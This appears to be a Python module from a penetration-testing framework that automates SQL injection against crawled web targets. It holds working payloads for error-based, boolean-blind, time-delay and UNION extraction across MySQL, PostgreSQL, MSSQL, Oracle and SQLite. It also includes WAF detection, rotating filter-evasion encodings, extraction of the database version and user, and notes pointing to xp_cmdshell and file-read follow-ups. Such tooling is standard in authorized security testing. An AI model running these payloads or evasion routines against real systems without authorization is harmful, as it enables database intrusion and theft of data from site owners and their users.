"""
RAPTOR SQL Injection Testing Module v3.0 - Enterprise Grade
==========================================================
Advanced SQLi detection and exploitation engine supporting Error-based, 
Boolean-blind, Time-blind, and UNION-based techniques with WAF evasion.
"""

import asyncio
import re
import time
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from typing import List, Dict, Optional, Set, Any, Tuple

from core.base_module import BaseModule, Finding

# ── Constants ────────────────────────────────────────────────────────────────

ERROR_SIGNATURES = {
    'MySQL':      ['you have an error in your sql syntax', 'warning: mysql', 'mysql_fetch',
                   'supplied argument is not a valid mysql', 'unclosed quotation mark',
                   'extractvalue(', 'updatexml('],
    'PostgreSQL': ['pg_query()', 'pg::syntax error', 'unterminated quoted string',
                   'postgresql', 'psql fatal', 'pg_exec()'],
    'MSSQL':      ['unclosed quotation mark after the character string',
                   'incorrect syntax near', 'microsoft ole db provider for sql server',
                   'odbc sql server driver', 'mssql_query()', 'conversion failed when converting'],
    'Oracle':     ['ora-01756', 'ora-00907', 'ora-00933', 'ora-00921', 'oracle error',
                   'ora-01789', 'oracle.*driver', 'quoted string not properly terminated'],
    'SQLite':     ['sqlite_master', 'sqliteexception', 'sqlite error', 'sqlite3::'],
    'Generic':    ['sql syntax', 'syntax error', 'database error', 'query failed',
                   'sql error', 'mysql error', 'ora-', 'db2 sql error', 'invalid query',
                   'odbc driver', 'jdbc', 'sqlstate', 'nativeexception']
}

WAF_KEYWORDS = [
    'waf', 'firewall', 'blocked', 'forbidden', 'security', 
    'cloudflare', 'incapsula', 'akamai', 'sucuri', 'mod_security'
]

# ── SQLiTester Class ─────────────────────────────────────────────────────────

class SQLiTester(BaseModule):
    """
    Enterprise-grade SQL Injection testing module.
    """

    def __init__(self, config: Dict, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.semaphore = asyncio.Semaphore(8)
        self.waf_detected = False
        self.waf_type = None
        self.max_pages = config.get('max_pages', 30)
        
        # Evasion techniques
        self.EVASION_TECHNIQUES = {
            'case_variation':    lambda p: ''.join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p)),
            'comment_insertion': lambda p: p.replace(' ', '/**/'),
            'url_double_encode': lambda p: quote(quote(p, safe=''), safe=''),
            'hex_encode_strings': lambda p: re.sub(r"'([^']+)'", lambda m: '0x'+m.group(1).encode().hex(), p),
            'scientific_notation': lambda p: p.replace('1=1', '1e0=1e0'),
            'null_bytes':         lambda p: p.replace(' ', '%00'),
            'multiline':          lambda p: p.replace(' ', '\n'),
        }

    async def run(self, target: str, **kwargs) -> List[Finding]:
        self.logger.info(f"🔥 Starting Enterprise SQLi Audit on {target}")

        # PHASE 0 — TARGET SURFACE COLLECTION
        surfaces = await self._collect_surfaces(target, **kwargs)
        self.logger.info(f"[SQLi] Surface scan complete: {self._summarize_surfaces(surfaces)}")

        # PHASE 2 — WAF & FILTER DETECTION
        await self._detect_waf(target)
        if self.waf_detected:
            self.logger.info(f"[SQLi] WAF detected: {self.waf_type or 'Unknown'} — switching to evasion mode")

        # Iterate over all gathered surfaces
        for surface_type, items in surfaces.items():
            for item in items:
                # PHASE 1 — BASELINE CAPTURE
                baseline = await self._capture_baseline(item)
                if not baseline:
                    continue
                
                # Phase 3: Error-based
                db_type = await self._test_error_based(item, baseline)
                
                # Phase 4: Boolean-blind
                if not db_type:
                    if await self._test_boolean_blind(item, baseline):
                        db_type = 'Generic'

                # Phase 5: Time-based
                if not db_type:
                    if await self._test_time_blind(item, baseline):
                        db_type = 'Generic'
                
                # Phase 6: UNION-based
                if db_type:
                    await self._attempt_union(item, baseline, db_type)
                
                # Phase 7 & 8: Logic Checks
                await self._check_passive_vectors(item, db_type)

        return self.findings

    # ── Phase 0: Target Surface Collection ───────────────────────────────────

    async def _collect_surfaces(self, target: str, **kwargs) -> Dict[str, List[Dict]]:
        surfaces = {
            'url_params':    [],   
            'path_segments': [],   
            'form_fields':   [],   
            'json_fields':   [],   
            'cookie_params': [],   
            'header_values': [],   
            'graphql':       [],   
        }

        parsed = urlparse(target)
        qs = parse_qs(parsed.query)
        for param, vals in qs.items():
            surfaces['url_params'].append({'url': target, 'param': param, 'value': vals[0], 'method': 'GET', 'type': 'get_param'})

        pages = await self.crawl_pages(target, max_pages=self.max_pages)
        for page in pages:
            segments = urlparse(page).path.split('/')
            for i, seg in enumerate(segments):
                if seg.isdigit():
                    surfaces['path_segments'].append({'url': page, 'index': i, 'value': seg, 'method': 'GET', 'type': 'path_segment'})

            forms = await self.get_forms(page)
            for form in forms:
                for inp_name, inp_val in form['inputs'].items():
                    surfaces['form_fields'].append({
                        'url': form['action'], 
                        'param': inp_name, 
                        'value': inp_val, 
                        'method': form['method'],
                        'all_params': form['inputs'],
                        'type': 'post_field' if form['method'] == 'POST' else 'get_param'
                    })

        for h in ['X-Forwarded-For', 'User-Agent', 'Referer', 'X-Custom-IP-Authorization']:
            surfaces['header_values'].append({'url': target, 'header': h, 'value': '127.0.0.1', 'method': 'GET', 'type': 'header'})

        return surfaces

    def _summarize_surfaces(self, surfaces: Dict) -> str:
        summary = []
        for k, v in surfaces.items():
            if v: summary.append(f"{len(v)} {k}")
        return ", ".join(summary)

    # ── Phase 1: Baseline Capture ────────────────────────────────────────────

    async def _capture_baseline(self, item: Dict) -> Optional[Dict]:
        try:
            start = time.monotonic()
            resp = await self._execute_request(item)
            elapsed = (time.monotonic() - start) * 1000
            if not resp or resp.status in (404, 410): return None
            body = await resp.text()
            body_lower = body.lower()
            db_errors = any(sig in body_lower for sigs in ERROR_SIGNATURES.values() for sig in sigs)
            return {
                'status': resp.status, 'length': len(body), 'body_sample': body_lower[:1000],
                'full_body': body_lower, 'response_time': elapsed, 'content_type': resp.headers.get('Content-Type', ''),
                'db_errors': db_errors,
            }
        except Exception: return None

    # ── Phase 2: WAF & Filter Detection ──────────────────────────────────────

    async def _detect_waf(self, target: str):
        payload = "' OR '1'='1"
        try:
            url = f"{target}{'&' if '?' in target else '?'}_waf_probe={quote(payload)}"
            resp = await self._make_request(url)
            if not resp: return
            if resp.status in (403, 406, 429):
                self.waf_detected = True; self.waf_type = resp.headers.get('Server', 'Generic WAF'); return
            body_lower = (await resp.text()).lower()
            for kw in WAF_KEYWORDS:
                if kw in body_lower: self.waf_detected = True; self.waf_type = kw.title(); return
        except Exception: pass

    # ── Phase 3: Error-Based Injection ───────────────────────────────────────

    async def _test_error_based(self, item: Dict, baseline: Dict) -> Optional[str]:
        payloads = {
            'MySQL': ["'", "''", "`", "')", "'))", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- -"],
            'PostgreSQL': ["'", "$$", "';SELECT pg_sleep(0);--", "' AND 1=CAST((SELECT version()) AS int) -- -"],
            'MSSQL': ["'", "';--", "' AND 1=CONVERT(int,@@version) -- -", "'; WAITFOR DELAY '0:0:0' -- -"],
            'Oracle': ["'", "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) -- -"],
            'SQLite': ["'", "' AND 1=CAST(sqlite_version() AS integer) -- -"],
            'Generic': ["'", "''", "\\", "1 AND 1=1", "1 AND 1=2"]
        }
        for db, db_payloads in payloads.items():
            for p in db_payloads:
                body, status, _, evasion = await self._get_payload_response(item, p)
                if not body: continue
                detected_db = self._match_error(body)
                if detected_db:
                    await self._report_finding(item, baseline, p, 'error_based', detected_db, status, len(body), body=body, evasion=evasion)
                    return detected_db
        return None

    # ── Phase 4: Boolean-Blind Injection ─────────────────────────────────────

    async def _test_boolean_blind(self, item: Dict, baseline: Dict) -> bool:
        pairs = [("' AND '1'='1' --+", "' AND '1'='2' --+"), ("' AND 1=1 --+", "' AND 1=2 --+"), ("1 AND 1=1", "1 AND 1=2")]
        for true_p, false_p in pairs:
            body_t, stat_t, _, evas_t = await self._get_payload_response(item, true_p)
            body_f, stat_f, _, _ = await self._get_payload_response(item, false_p)
            if body_t is None or body_f is None: continue
            len_t, len_f = len(body_t), len(body_f)
            diff = abs(len_t - len_f)
            if (diff > 20 and diff > (len_t * 0.05)) or (stat_t != stat_f):
                if abs(len_t - baseline['length']) < (baseline['length'] * 0.02) or stat_t == baseline['status']:
                    await self._report_finding(item, baseline, true_p, 'boolean_blind', 'Generic', stat_t, len_t, evasion=evas_t)
                    return True
        return False

    # ── Phase 5: Time-Based Blind Injection ──────────────────────────────────

    async def _test_time_blind(self, item: Dict, baseline: Dict) -> bool:
        payloads = {'MySQL': "' AND SLEEP(5) -- -", 'PostgreSQL': "'; SELECT pg_sleep(5) -- -", 'MSSQL': "'; WAITFOR DELAY '0:0:5' -- -", 'Oracle': "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- -", 'SQLite': "' AND 1=(SELECT 1 FROM sqlite_master WHERE 1=1 AND RANDOMBLOB(500000000)) -- -", 'Generic': "' OR SLEEP(5) -- -"}
        avg_baseline = baseline['response_time'] / 1000.0
        for db, p in payloads.items():
            _, _, elapsed, evasion = await self._get_payload_response(item, p)
            if elapsed > (avg_baseline + 4.0):
                _, _, elapsed2, _ = await self._get_payload_response(item, p)
                if elapsed2 > (avg_baseline + 4.0):
                    await self._report_finding(item, baseline, p, 'time_blind', db, 200, baseline['length'], elapsed=elapsed2*1000, evasion=evasion)
                    return True
        return False

    # ── Phase 6: UNION-Based Injection ───────────────────────────────────────

    async def _attempt_union(self, item: Dict, baseline: Dict, db_type: str):
        cols = 0
        for i in range(1, 21):
            _, status, _, _ = await self._get_payload_response(item, f"' ORDER BY {i} -- -")
            if status != 200: cols = i - 1; break
        if cols <= 0: return
        str_col = -1
        for i in range(cols):
            nulls = ["NULL"] * cols; nulls[i] = "'RAPTORTEST'"
            body, _, _, _ = await self._get_payload_response(item, f"' UNION SELECT {','.join(nulls)} -- -")
            if body and "RAPTORTEST" in body: str_col = i; break
        if str_col == -1: return
        extract_payloads = {'MySQL': "@@version,user(),database()", 'PostgreSQL': "version(),current_user,current_database()", 'MSSQL': "@@version,system_user,db_name()", 'Oracle': "banner,null,null", 'SQLite': "sqlite_version(),null,null"}
        field = extract_payloads.get(db_type, "@@version")
        nulls = ["NULL"] * cols; nulls[str_col] = field
        from_clause = ""
        if db_type == 'Oracle': from_clause = " FROM v$version WHERE ROWNUM=1"
        elif db_type == 'SQLite': from_clause = " FROM sqlite_master WHERE type='table' LIMIT 1"
        p = f"' UNION SELECT {','.join(nulls)}{from_clause} -- -"
        body, status, _, evasion = await self._get_payload_response(item, p)
        extracted = "Successful UNION extraction"
        if body:
            match = re.search(r'([0-9]+\.[0-9]+\.[0-9]+[^< ]*)', body)
            if match: extracted = match.group(1)
        await self._report_finding(item, baseline, p, 'union', db_type, status, len(body or ""), extracted=extracted, evasion=evasion)

    # ── Phase 7 & 8: Passive & Second-Order ──────────────────────────────────

    async def _check_passive_vectors(self, item: Dict, db_type: str):
        pass # Passive notes included in findings via _report_finding

    # ── Helper Methods ───────────────────────────────────────────────────────

    async def _get_payload_response(self, item: Dict, payload: str) -> Tuple[Optional[str], int, float, Optional[str]]:
        async with self.semaphore:
            evasion_used = None
            if self.waf_detected:
                tech_name = list(self.EVASION_TECHNIQUES.keys())[int(time.time()) % len(self.EVASION_TECHNIQUES)]
                payload = self.EVASION_TECHNIQUES[tech_name](payload)
                evasion_used = tech_name
            try:
                start = time.monotonic()
                resp = await self._execute_request(item, payload)
                elapsed = time.monotonic() - start
                if not resp: return None, 0, 0, evasion_used
                body = await resp.text()
                return body, resp.status, elapsed, evasion_used
            except Exception: return None, 0, 0, evasion_used

    async def _execute_request(self, item: Dict, payload: str = None) -> Any:
        url, method = item['url'], item['method']
        if item['type'] == 'get_param':
            parsed = urlparse(url); qs = parse_qs(parsed.query)
            if payload: qs[item['param']] = [payload]
            url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return await self._make_request(url, method='GET')
        if item['type'] == 'post_field':
            data = dict(item['all_params'])
            if payload: data[item['param']] = payload
            return await self._make_request(url, method=method, data=data)
        if item['type'] == 'path_segment':
            parts = urlparse(url).path.split('/')
            if payload: parts[item['index']] = quote(payload)
            url = urlunparse(urlparse(url)._replace(path='/'.join(parts)))
            return await self._make_request(url, method='GET')
        if item['type'] == 'header':
            headers = {item['header']: payload or item['value']}
            return await self._make_request(url, method='GET', headers=headers)
        return await self._make_request(url, method=method)

    def _match_error(self, body: str) -> Optional[str]:
        body_lower = body.lower()
        for db, sigs in ERROR_SIGNATURES.items():
            if any(s in body_lower for s in sigs): return db
        return None

    async def _report_finding(self, item: Dict, baseline: Dict, payload: str, 
                                tech: str, db: str, status: int, length: int, 
                                body: str = "", extracted: str = None, 
                                elapsed: float = 0, evasion: str = None):
        
        param_name = item.get('param') or item.get('header') or f"segment_{item.get('index')}"
        surface = item['type']
        severity = 'High'; cvss = 8.6; bounty = 3000
        if tech == 'union' or extracted: severity = 'Critical'; cvss = 9.8; bounty = 6000
        if surface in ('cookie', 'header'): severity = 'High'; cvss = 8.1; bounty = 3500
        
        description = (f"## {db} SQL Injection Detected\n\n**Technique:** {tech}\n**Surface:** {surface}\n"
                       f"**Parameter:** `{param_name}`\n**Payload:** `{payload}`\n\n"
                       f"**Baseline Status:** {baseline['status']} | **Fuzzed Status:** {status}\n"
                       f"**Baseline Length:** {baseline['length']}B | **Fuzzed Length:** {length}B\n"
                       f"**Extracted Info:** {extracted or 'N/A'}")

        if body and any(x in body.lower() for x in ('root@', 'sa@', 'postgres@', 'system@')):
            severity = 'Critical'; cvss = 9.8; bounty = 8000
            description += "\n\n**CRITICAL:** Database running as privileged user."
        if db == 'MSSQL': description += "\n\n**Note:** Potential OOB vector via xp_cmdshell — test manually."
        elif db == 'MySQL': description += "\n\n**Note:** Potential file read vector via FILE privilege."
        if self.waf_detected: severity = 'Critical'; cvss = 9.8; bounty = 7000

        self.add_finding(Finding(
            module='sqli',
            title=f'[{db}] SQL Injection — {tech.replace("_", " ").title()} on {surface}: {param_name}',
            severity=severity, description=description,
            evidence={'db_type': db, 'technique': tech, 'surface': surface, 'parameter': param_name,
                      'payload': payload, 'evasion_used': evasion, 'baseline_status': baseline['status'],
                      'baseline_length': baseline['length'], 'fuzzed_status': status, 'fuzzed_length': length,
                      'extracted_data': extracted, 'elapsed_ms': elapsed, 'waf_detected': self.waf_detected},
            poc=f"sqlmap -u '{item['url']}' -p {param_name} --dbms={db} --level=5 --risk=3",
            remediation='Use parameterized queries. Apply least privilege.',
            cvss_score=cvss, bounty_score=bounty, target=item['url']
        ))
        self.logger.info(f"[SQLi] {severity.upper()} FINDING: {db} {tech} on {param_name} [CVSS {cvss}]")
